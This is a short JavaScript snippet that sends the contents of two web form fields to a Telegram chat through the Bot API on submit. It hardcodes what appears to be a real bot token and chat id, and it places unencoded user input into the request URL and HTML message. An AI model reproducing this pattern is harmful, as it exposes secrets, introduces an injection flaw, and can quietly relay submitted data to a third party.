const form = document.querySelector("#form")

form.addEventListener("submit", (e) => {
    e.preventDefault()

    var text1 = document.getElementById("text1").value;
    var text2 = document.getElementById("text2").value;

    var token = "6468935281:AAGS6e3h0_rCnh2APkXNRNNsj6dMoKkd0ZE"

    var myText = `Result is: %0A - <b>Text1</b>: <i>${text1}</i> %0A - <b>Text2</b>: <i>${text2}</i>`
    var chat_id = -4037272713

    var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${myText}&parse_mode=html`


    let api = new XMLHttpRequest()
    api.open("GET", url, true)
    api.send()

    console.log("Message successfully sended")

})